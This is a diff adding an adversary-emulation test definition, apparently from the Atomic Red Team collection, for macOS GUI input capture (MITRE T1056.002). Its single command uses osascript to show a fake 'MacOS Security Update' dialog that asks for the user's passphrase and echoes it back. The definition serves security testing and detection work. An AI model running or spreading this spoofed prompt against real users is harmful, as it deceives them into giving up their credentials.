@@ -1,0 +1,30 @@
+- id: b7037b89-947a-427a-ba29-e7e9f09bc045
+  name: AppleScript - Spoofing a credential prompt using osascript
+  description: 'Prompt user for password without requiring permissions to send Apple
+    events to System Settings.
+
+    https://embracethered.com/blog/posts/2021/spoofing-credential-dialogs/'
+  tactic: collection
+  technique:
+    attack_id: T1056.002
+    name: 'Input Capture: GUI Input Capture'
+  platforms:
+    darwin:
+      sh:
+        command: PWD_SPOOF=$(osascript -e 'display dialog "To perform a security update
+          MacOS needs your passphrase." with title "MacOS Security Update" default
+          answer "" with icon stop with hidden answer'); echo $PWD_SPOOF
+  plugin: atomic
+  singleton: false
+  repeatable: true
+  delete_payload: false
+  privilege: ''
+  buckets:
+  - collection
+  - atomic-red-team
+  - t1056.002
+  author: Atomic Red Team
+  additional_info:
+    technique_created: '2020-02-11T18:58:45.908Z'
+    atomic_guid: b7037b89-947a-427a-ba29-e7e9f09bc045
+    import_timestamp: '2025-06-24T11:14:07.623454Z'
